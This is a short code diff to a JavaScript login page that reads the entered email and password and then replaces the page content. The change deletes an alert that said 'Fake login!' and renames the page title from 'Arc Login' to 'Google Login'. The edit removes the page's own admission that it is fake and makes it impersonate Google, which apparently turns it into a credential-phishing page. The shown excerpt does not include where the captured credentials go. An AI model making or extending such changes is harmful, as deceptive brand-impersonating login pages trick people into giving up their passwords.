@@ -113,12 +113,11 @@ document.querySelector('button').addEventListener('click', function() {
   const password = document.querySelector('input[type="password"]').value.trim();
   
   if (email !== '' && password !== '') {
-    alert('Fake login!');
     document.documentElement.innerHTML = `
       <!DOCTYPE html>
       <html lang="en">
       <head>
-          <title>Arc Login</title>
+          <title>Google Login</title>
 
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
